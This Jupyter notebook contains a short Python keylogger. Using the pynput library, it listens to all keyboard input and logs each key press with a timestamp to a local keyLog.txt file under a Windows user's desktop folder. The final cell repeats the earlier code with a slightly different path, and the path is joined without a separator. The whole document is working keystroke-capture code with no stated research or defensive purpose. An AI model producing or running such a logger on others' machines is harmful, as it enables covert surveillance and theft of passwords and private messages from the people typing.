{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "log_dir = r\"C:\\Users\\Acer\\Desktop\\My Work\\Machine\"\n",
    "logging.basicConfig(filename = (log_dir + \"keyLog.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "   logging.info(str(key))\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()\n",
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "log_dir = r\"C:\\Users\\Acer\\Desktop\\My Work\\Machin\"\n",
    "logging.basicConfig(filename = (log_dir + \"keyLog.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
    "def on_press(key):\n",
    "    logging.info(str(key))\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
